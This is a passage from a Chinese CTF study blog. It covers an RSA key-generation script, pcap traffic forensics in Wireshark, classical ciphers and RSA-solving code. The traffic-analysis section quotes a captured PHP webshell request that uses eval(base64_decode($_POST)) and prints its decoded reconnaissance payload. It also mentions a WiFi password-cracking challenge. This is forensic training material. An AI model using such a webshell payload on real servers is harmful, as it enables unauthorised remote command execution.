"""</span></span><br><span class="line">        seq = Sequence()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, self.n, self.e, self.d, self.p, self.q, self.dP, self.dQ, self.qInv]:</span><br><span class="line">            seq.setComponentByPosition(len(seq), Integer(x))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> encoder.encode(seq)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(self, verbose)</span>:</span></span><br><span class="line">        vars = [<span class="string">'n'</span>, <span class="string">'e'</span>, <span class="string">'d'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            vars += [<span class="string">'dP'</span>, <span class="string">'dQ'</span>, <span class="string">'qInv'</span>]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> vars:</span><br><span class="line">            self._dumpvar(v)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_dumpvar</span><span class="params">(self, var)</span>:</span></span><br><span class="line">        val = getattr(self, var)</span><br><span class="line"> </span><br><span class="line">        parts = <span class="keyword">lambda</span> s, l: <span class="string">'\n'</span>.join([s[i:i+l] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), l)])</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> len(str(val)) &lt;= <span class="number">40</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%s = %d (%#x)\n'</span> % (var, val, val)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%s ='</span> % var</span><br><span class="line">            <span class="keyword">print</span> parts(<span class="string">'%x'</span> % val, <span class="number">80</span>) + <span class="string">'\n'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line"> </span><br><span class="line">    parser.add_option(<span class="string">'-p'</span>, dest=<span class="string">'p'</span>, help=<span class="string">'prime'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-q'</span>, dest=<span class="string">'q'</span>, help=<span class="string">'prime'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-n'</span>, dest=<span class="string">'n'</span>, help=<span class="string">'modulus'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-d'</span>, dest=<span class="string">'d'</span>, help=<span class="string">'private exponent'</span>, type=<span class="string">'int'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-e'</span>, dest=<span class="string">'e'</span>, help=<span class="string">'public exponent (default: %d)'</span> % DEFAULT_EXP, type=<span class="string">'int'</span>, default=DEFAULT_EXP)</span><br><span class="line">    parser.add_option(<span class="string">'-o'</span>, dest=<span class="string">'filename'</span>, help=<span class="string">'output filname'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>, dest=<span class="string">'format'</span>, help=<span class="string">'output format (DER, PEM) (default: PEM)'</span>, type=<span class="string">'choice'</span>, choices=[<span class="string">'DER'</span>, <span class="string">'PEM'</span>], default=<span class="string">'PEM'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-v'</span>, dest=<span class="string">'verbose'</span>, help=<span class="string">'also display CRT-RSA representation'</span>, action=<span class="string">'store_true'</span>, default=<span class="keyword">False</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        (options, args) = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> options.p <span class="keyword">and</span> options.q:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Using (p, q) to initialise RSA instance\n'</span></span><br><span class="line">            rsa = RSA(p=options.p, q=options.q, e=options.e)</span><br><span class="line">        <span class="keyword">elif</span> options.n <span class="keyword">and</span> options.d:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Using (n, d) to initialise RSA instance\n'</span></span><br><span class="line">            rsa = RSA(n=options.n, d=options.d, e=options.e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.print_help()</span><br><span class="line">            parser.error(<span class="string">'Either (p, q) or (n, d) needs to be specified'</span>)</span><br><span class="line"> </span><br><span class="line">        rsa.dump(options.verbose)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> options.filename:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Saving %s as %s'</span> % (options.format, options.filename)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> options.format == <span class="string">'PEM'</span>:</span><br><span class="line">                data = rsa.to_pem()</span><br><span class="line">            <span class="keyword">elif</span> options.format == <span class="string">'DER'</span>:</span><br><span class="line">                data = rsa.to_der()</span><br><span class="line"> </span><br><span class="line">            fp = open(options.filename, <span class="string">'wb'</span>)</span><br><span class="line">            fp.write(data)</span><br><span class="line">            fp.close()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">except</span> optparse.OptionValueError, e:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        parser.error(e.msg)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p>1.CTFwiki–<a href="https://wiki.x10sec.org/crypto/introduction/" rel="external nofollow" target="_blank">密码学部分</a></p>
<p>2.RSA介绍–<a href="https://www.jianshu.com/p/0c4943d7ea2d" rel="external nofollow" target="_blank">总结</a></p>
<h2 id="day02–Danie1"><a href="#day02–Danie1" class="headerlink" title="day02–Danie1"></a>day02–Danie1</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><hr>
<p>在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件，参赛选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索。 </p>
<p>pcap流量包的分析通常都是通过图形化的网络嗅探器——wireshark进行的，这款嗅探器经过众多开发者的不断完善，现在已经成为使用最为广泛的安全工具之一。</p>
<p>Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。</p>
<h3 id="经典题型"><a href="#经典题型" class="headerlink" title="经典题型"></a>经典题型</h3><ul>
<li>CTF题型主要分为流量包修复、WEB流量包分析、USB流量包分析和其他流量包分析。</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
<li><p>流量包修复</p>
<p>比赛中可能会出现通过wireshark打开题目给的流量包后提示包异常的情况，如图</p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080601.png" alt=""></p>
</li>
<li><p>思路</p>
<ul>
<li>在线修复网站：<a href="http://f00l.de/hacking/pcapfix.php" rel="external nofollow" target="_blank">http://f00l.de/hacking/pcapfix.php</a></li>
</ul>
</li>
<li><p>题目</p>
<p>第一届 “百度杯” 信息安全攻防总决赛 线上选拔赛：find the flag</p>
<p>pacp文件地址：<a href="https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap" rel="external nofollow" target="_blank">https://static2.ichunqiu.com/icq/resources/fileupload/CTF/BSRC/2017/BSRC3-1/findtheflag.cap</a></p>
</li>
<li><p>解题思路：</p>
<ul>
<li><p>在线修复，修复完毕后用wireshark打开，查找分组字节流-字符串-flag</p>
</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080602.png" alt=""></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>看到where is the flag？继续查看下一个数据包</p>
</li>
<li><p>发现两个包id对应的字段刚好是flag</p>
</li>
<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080603.png" alt=""></p>
</li>
</ul>
<ul>
<li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080604.png" alt=""></li>
</ul>
<ul>
<li><p>按照同样的方式连接后面相连数据包的id字段，找到最终的flag</p>
<p><code>flag{aha!_you_found_it!}</code></p>
</li>
</ul>
<ul>
<li><p>基本的流量包分析</p>
</li>
<li><p>question</p>
<p>题目  test3.pcapng</p>
</li>
<li><p>question</p>
<p>题目 test.pcapng</p>
</li>
<li><p>question</p>
<p>题目链接：链接: <a href="https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg" rel="external nofollow" target="_blank">https://pan.baidu.com/s/1r1ssdqO8qC72s_mI-3dlYg</a>  密码: l43q</p>
</li>
</ul>
<p>  解题思路：wireshark打开流量包</p>
<p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080605.png" alt=""></p>
<p>  可以看到User和pass，且都是base64编码</p>
<p>  解码可以得到</p>
<p>  user:<a href="mailto:test@51elab.com" rel="external nofollow" target="_blank">test@51elab.com</a></p>
<p>  passwd:FLAG:ISCCTESTpas</p>
<ul>
<li><p>question</p>
<p>题目链接：链接: <a href="https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg" rel="external nofollow" target="_blank">https://pan.baidu.com/s/179QOyUcjzGd9Qwy-81qweg</a>  密码: 9r2i</p>
</li>
</ul>
<p>​      解题思路：wireshark打开流量包，追踪tcp流，在第二个流中发现flag</p>
<p>​         <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080606.png" alt=""></p>
<ul>
<li><p>question</p>
<p>题目链接：链接: <a href="https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A" rel="external nofollow" target="_blank">https://pan.baidu.com/s/1JAdSeAJ-q-Pf3R1mibt93A</a>  密码: wk6w</p>
</li>
</ul>
<p>  解题思路：wireshark打开流量包，过滤显示http协议包</p>
<p> <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080607.png" alt=""></p>
<p>  发现不停的向一个目录post数据，猜测有人在上传一句话</p>
<p>  追踪tcp流，发现</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure>
<p>  先进行url解码，再进行base64解码，得到</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">  </span><br><span class="line">@ini_set(“display_errors”,”0″);</span><br><span class="line">  </span><br><span class="line">@set_time_limit(0);</span><br><span class="line">  </span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">  </span><br><span class="line">echo(“-&gt;|”);;</span><br><span class="line">  </span><br><span class="line">$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">  </span><br><span class="line">if($D==”&quot;)</span><br><span class="line">  </span><br><span class="line">    $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">  </span><br><span class="line">$R=”&#123;$D&#125;\t”;</span><br><span class="line">  </span><br><span class="line">if(substr($D,0,1)!=”/”)</span><br><span class="line">  </span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">    foreach(range(“A”,”Z”) as $L)</span><br><span class="line">  </span><br><span class="line">        if(is_dir(“&#123;$L&#125;:”))</span><br><span class="line">  </span><br><span class="line">            $R.=”&#123;$L&#125;:”;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">$R.=”\t”;</span><br><span class="line">  </span><br><span class="line">$u=(function_exists(‘posix_getegid’))?@posix_getpwuid(@posix_geteuid()):”;</span><br><span class="line">  </span><br><span class="line">$usr=($u)?$u[&apos;name&apos;]:@get_current_user();</span><br><span class="line">  </span><br><span class="line">$R.=php_uname();</span><br><span class="line">  </span><br><span class="line">$R.=”(&#123;$usr&#125;)”;</span><br><span class="line">  </span><br><span class="line">print $R;;</span><br><span class="line">  </span><br><span class="line">echo(“|&lt;-”);</span><br><span class="line">  </span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
<p>  在tcp stream 5发现一个压缩包，下载</p>
<p>  在tcp stream 6发现png文件头89504E47</p>
<p>  保存为一张png图片</p>
<ul>
<li><p>question</p>
<p>破解wifi密码（文件wifi.cap）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;你破解的WiFi密码&#125;</span><br><span class="line"></span><br><span class="line">tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你</span><br><span class="line">1391040**</span><br><span class="line">Goodluck!!</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080608.png" alt=""></p>
</li>
</ul>
<p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080609.png" alt=""></p>
<h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><hr>
<p><a href="https://blog.csdn.net/qq_41187256/article/details/79693012" rel="external nofollow" target="_blank">https://blog.csdn.net/qq_41187256/article/details/79693012</a></p>
<ul>
<li><p>栅栏密码</p>
<p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话</p>
<p>明文：THERE IS A CIPHER<br>去掉空格后变为：THEREISACIPHER<br>两个一组，得到：TH ER EI SA CI PH ER<br>先取出第一个字母：TEESCPE<br> 再取出第二个字母：HRIAIHR<br>连在一起就是：TEESCPEHRIAIHR<br>还原为所需密码。<br>而解密的时候，我们先把密文从中间分开，变为两行：<br>T E E S C P E<br>H R I A I H R<br>再按上下上下的顺序组合起来：<br>THEREISACIPHER<br>分出空格，就可以得到原文了：<br>THERE IS A CIPHER</p>
</li>
<li><p>Brainfuck/Ook!编码</p>
</li>
<li><p><a href="https://tool.bugku.com/brainfuck/" rel="external nofollow" target="_blank">https://tool.bugku.com/brainfuck/</a></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure>
<ul>
<li><p>培根密码中的ab,代表的是数学二进制中的0和1.通过下列的密码表进行加密和解密：<br>第一种方式：<br>A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab<br>K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb Y bbaaa Z bbaab<br>第二种方式<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA</p>
<p>f AABAB m ABABB s BAAAB z BABBB</p>
</li>
</ul>
<p>例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baabbaabaabaaaababbaaabbaabbababbabaaabb</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/xuqi7/article/details/52261291" rel="external nofollow" target="_blank">脚本工具</a></p>
<ul>
<li><p>caesar（凯撒）</p>
<p>使用python pycipher库</p>
<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080610.png" alt=""></p>
</li>
</ul>
<ul>
<li><p>RSA算法(非对称密码)</p>
<p>加密过程  选择两个大素数p和q，计算出模数N = p * q </p>
<p>计算φ = (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质</p>
<p> 取e的模反数为d，计算方法: e * d ≡ 1 (mod φ) </p>
<p>对明文m进行加密：c≡m^e (mod n) 或 c = pow(m,e,n)，得到的B即为密文 </p>
<p>对密文c进行解密，m≡c^d( mod n) 或 m = pow(c,d,n)，得到的A即为明文</p>
<p> p 和 q ：大整数N的两个因子（factor）</p>
<p> N：大整数N，我们称之为模数（modulus）</p>
<p> e 和 d：互为模反数的两个指数（exponent）</p>
<p> c 和 m：分别是密文和明文，这里一般指的是一个十进制的数</p>
<p>一般有如下称呼：</p>
<p>（N，e）：公钥</p>
<p>（N，d）：私钥</p>
<p>分解N可以在线factordb.com</p>
</li>
<li><p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_n</span><span class="params">(n)</span>:</span>   <span class="comment">#分解n</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">        <span class="keyword">if</span> n%i == <span class="number">0</span>:</span><br><span class="line">            p = i</span><br><span class="line">            q = int(n/i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">n=<span class="number">2135733555619387051</span></span><br><span class="line">c=<span class="number">781391873123526159</span></span><br><span class="line">p,q=split_n(n)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">'c:%d'</span>%c)</span><br><span class="line">print(<span class="string">"p = "</span> + str(p))</span><br><span class="line">print(<span class="string">"q = "</span> + str(q))</span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line">m=pow(c,d,n)   <span class="comment">#快速幂取模</span></span><br><span class="line">print(<span class="string">'m = '</span>+str(m))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>常见题型的分类</strong></p>
<p><strong>（1）已知p、q、e求解d</strong></p>
<p><strong>解题思路：</strong>根据 φ = (p−1) <em> (q−1)这一欧拉函数式， 可以使用所给的p、q求解出n的欧拉函数值φ,之后再根据       e </em> d ≡ 1 (mod φ) 即可求解出d的值。</p>
<p>题目</p>
<p><a href="http://www.shiyanbar.com/ctf/1828" rel="external nofollow" target="_blank">http://www.shiyanbar.com/ctf/1828</a></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p=<span class="number">473398607161</span></span><br><span class="line">    q=<span class="number">4511491</span></span><br><span class="line">    e=<span class="number">17</span></span><br><span class="line">    f_n=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    d=modinv(e,f_n)</span><br><span class="line">    print(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><strong>已知p、q、e、c求解明文</strong></p>
<p><strong>思路：</strong>根据<strong>n=p*q</strong>求解出n的值，之后再根据<strong>φ = (p−1) * (q−1)</strong>，求解出n的欧拉函数的值，之后再根据<strong>e * d ≡ 1 (mod φ)</strong>求解出d的值，之后再根据<strong>m≡c^d( mod n) 或 m = pow(c,d,n)</strong>求解出明文信息即可！</p>
<p>题目</p>
<p><a href="http://www.shiyanbar.com/ctf/1979" rel="external nofollow" target="_blank">http://www.shiyanbar.com/ctf/1979</a></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求d</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        exit(<span class="string">'wrong'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q=<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">c=<span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">f_n=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">print(<span class="string">'n:%d'</span>%n)</span><br><span class="line">print(<span class="string">'e:%d'</span>%e)</span><br><span class="line">print(<span class="string">'c:%d'</span>%c)</span><br><span class="line"></span><br><span class="line">d=modinv(e,f_n)</span><br><span class="line">print(<span class="string">'d = '</span>+str(d))</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(<span class="string">"------------"</span>)</span><br><span class="line">print(<span class="string">'message:%d'</span>%m)</span><br></pre></td></tr></table></figure>
<p>题目</p>
<p><a href="http://ctf5.shiyanbar.com/crypto/RSAROLL.txt" rel="external nofollow" target="_blank">http://ctf5.shiyanbar.com/crypto/RSAROLL.txt</a></p>
